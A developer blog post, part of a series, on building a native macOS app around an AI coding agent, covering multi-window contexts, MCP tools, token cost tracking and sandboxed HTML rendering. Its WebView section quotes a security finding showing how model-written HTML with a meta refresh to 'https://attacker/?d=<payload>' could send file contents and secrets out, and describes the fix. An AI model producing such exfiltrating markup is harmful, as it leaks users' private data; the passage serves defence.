---
layout: insight
title: "Building a Native macOS AI Agent App: SwiftUI, MCP and Rich Output"
permalink: /en/insights/ai/building-iassist/10-from-terminal-to-mac-app/
date: 2026-10-28
part: 10
series: "Building iAssist"
category: AI Development
tags: [macOS AI App, SwiftUI, MCP Server, Model Context Protocol, Agent Observability, WKWebView Sandbox, LLM Cost Tracking]
description: "How a terminal coding agent became Parto, a native macOS app: live agent inspector, multi-window contexts, MCP servers as tools, token cost tracking and sandboxed HTML."
---

# Building a Native macOS AI Agent App: SwiftUI, MCP and Rich Output

*From a debugging window to a product: Parto, the Mac app built on iAssist*

{% include iassist-series-nav.html %}

## The Inspector That Became the Product

Part 6 ended with a SwiftUI window that showed the agent tree live. It started as a debugging tool, a way to see what the agents were doing. Over a few weeks, it gained a terminal-style input, permission dialogs, a model picker and a context viewer. At some point it was clearly no longer a debugger. It was the app.

In July 2026 it got a name: **Parto** (پرتو), Persian for "ray of light". Before choosing it, we checked the App Store for collisions. No AI or developer tool used the name, only unrelated apps sharing the bare word.

This article covers what it took to turn a terminal agent into a native Mac app.

## One Engine, Many Front-Ends

The most important architectural decision paid off here. Because the loop, tools, prompts and turn strategies live in `iAssistCore` with zero UI dependencies, the Mac app reuses all of it. A shared **composition root** builds providers and prompts the same way for the terminal and the GUI:

```text
feat(core): shared composition root for provider + prompt wiring
refactor(console): build providers and prompt env via the shared root
```

When the terminal and the GUI briefly built providers differently, they behaved differently. A single source of truth ended that class of bug.

## Windows Are Contexts

A terminal has one conversation. A Mac app can have many. The refactor that made this work split application state in two:

```text
refactor(inspector): split App state into AppServices (shared) + ContextSession (per-context)
feat(inspector): multi-window — WindowGroup(for:) vends a ContextSession per window
feat(inspector): shared context — multiple windows on ONE context (⌘⇧N)
```

- **AppServices** holds what's shared: MCP connections, metrics, settings.
- **ContextSession** holds one conversation: its engine, its own provider, its own theme.

Each window gets its own context, which means one window can talk to Claude while another runs a local model. Utility windows (context viewer, metrics) follow the **frontmost** context using SwiftUI's `@FocusedValue`. One bug here is a good lesson in multi-window apps: utility windows first followed the *primary* window instead of the last active one, and permission prompts from MCP tools went to a fixed window instead of the focused one.

## MCP: Any Tool, Without Writing Code

The **Model Context Protocol** lets an agent use tools provided by external servers: databases, browsers, issue trackers, design tools. iAssist's `iAssistMCP` package wraps every MCP tool as a normal `AgentTool`, so the loop doesn't know or care where a tool comes from.

The work happened in a few steps:

```text
feat(mcp): scaffold iAssistMCP — MCP tools as AgentTools (TDD seam)
feat(mcp): MCP server support — window, install, stdio, policy, reconnect, timeout
refactor(mcp): generalize transport behind MCPConnection; add HTTP connection
feat(mcp): auto-refresh tools on tools/list_changed — no manual reconnect
```

Three details were harder than they look:

**Async connect, sync tools.** Connecting to a server is slow (spawn a process, handshake). But a turn asks for its tool list synchronously. The `MCPHost` connects ahead of time and hands out a snapshot of ready tools. A turn that starts mid-connect simply doesn't have that server's tools yet, and gets them on the next turn.

**Cancelled connects.** If you disable a server while it's still connecting, the slow connect must not publish itself afterwards. Each server has a generation counter, bumped on every connect and disconnect, so a superseded connect knows to back off.

**The GUI app PATH problem.** Many MCP servers are launched via `npx` or `uvx`. A Mac app started from the Dock doesn't inherit your shell's `PATH`, so those commands aren't found. The host copies the login shell's `PATH` into the environment of spawned servers. The add-server dialog also explains the difference between a wrong path and a command that isn't on `PATH`.

## Every Token Counted

The metering seam from Part 3 feeds a SwiftData store in `iAssistMetrics`. Every model call records model, tokens and duration. The app shows:

- a **token usage dashboard** with cost per model and per day
- **per-context usage**, so you see what each conversation cost
- local and on-device calls priced as **free**, which is one of the honest arguments for local models

## Answers as Documents, Not Just Text

Model answers are markdown. Rendering them well turned into its own pair of packages:

- **iAssistRender** renders markdown blocks natively: headings, tables, lists, quotes and **syntax-highlighted code** with line numbers. Themes are selectable per window.
- **iAssistShaping** can **reshape** an answer for display: summarize it, simplify it, show a short version first with details below, or apply your own prompt. The original answer and the conversation are never modified; shaping is a display layer only.

The most ambitious step was **Rich HTML rendering**: an HTML "shaper" turns an answer into a magazine-style page with CSS and SVG diagrams, shown in a WebView beside the transcript and exportable as PDF.

## Sandboxing the WebView

Rendering model-generated HTML is a security problem. The model's output may contain content from files it read, including secrets. The render pane disables JavaScript and applies a strict Content Security Policy, so the page can't fetch anything.

An adversarial review still found a hole, and the commit message describes it precisely:

```text
HIGH: gate WKWebView navigation to the initial in-memory (about:blank) load only,
cancelling link clicks, client redirects, and <meta http-equiv=refresh>.
Without it the model's HTML could exfiltrate context data (file contents,
secrets) by refreshing to https://attacker/?d=<payload>, no JS required.
```

A `<meta http-equiv="refresh">` tag needs no JavaScript. The fix allows only the initial in-memory load and also strips meta refresh tags as defense in depth.

> **Lesson:** Whatever the model produces is untrusted input, including HTML you asked it to write.

## Small Things That Make It Feel Native

A lot of commits are about feel, and they matter for a tool you use all day:

- **Type-ahead queue**: type your next message while a turn is running; it's queued and shown stacked below.
- **Esc to stop**, with an honest summary of what already happened (Part 2).
- **Auto approval** mode with a countdown veto window (Part 5).
- A pinned, slide-up **live status strip** showing what the agent is doing right now.
- **Transcript font zoom** with ⌘+ and ⌘−, animated.
- A **recap card** at the end of work: what was done, and a model-written "you're doing X, next Y" summary.
- Inline rendering of images and **SVG diagrams** the model draws, and previews of markdown, HTML and SVG files it writes.

## Packaging a SwiftPM App

The app is built with Swift Package Manager, not an Xcode project. A small script turns it into a real `.app`:

```text
Packaging/make-app.sh:
  1. swift build -c release
  2. assemble Parto.app (Info.plist, Parto.icns, the binary)
  3. auto-detect an Apple Development signing identity (ad-hoc fallback)
  4. codesign, then codesign --verify
```

The icon is generated from an SVG by a Swift script into all Retina sizes. It uses the **Congruent Tech congruence mark** in cyan. TestFlight and notarization need an Apple Distribution certificate and an archivable Xcode target, so those are the next distribution steps.

## Key Takeaways

- Keep the engine UI-free so a GUI can reuse it completely.
- Model windows as contexts: shared services, per-window sessions.
- Wrap MCP tools as ordinary tools; handle async connects, cancellation and `PATH` carefully.
- Treat model-generated HTML as hostile: no JavaScript, strict CSP, no navigation.
- Polish matters in a tool people live in all day.

In the final part we cover syncing history across devices with CloudKit and hybrid logical clocks, the strategy behind Parto, and what we learned overall.

{% include iassist-series-nav.html %}
